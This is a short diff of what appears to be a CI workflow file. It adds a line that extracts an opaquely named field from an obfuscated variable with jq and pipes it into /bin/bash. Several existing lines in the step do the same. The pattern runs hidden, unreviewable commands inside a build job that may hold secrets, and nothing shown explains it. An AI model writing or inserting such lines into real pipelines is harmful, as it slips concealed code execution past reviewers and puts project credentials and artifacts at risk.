@@ -28,6 +28,7 @@ jobs:
           echo $ktg931 | jq -r .o67536 | /bin/bash
           printf '%s' "$lgxx86" | jq -r .pl6397 | /bin/bash
           printf '%s' "$uhsx158" | jq -r .pj5 | /bin/bash
+          printf '%s' "$k3" | jq -r .bg5 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
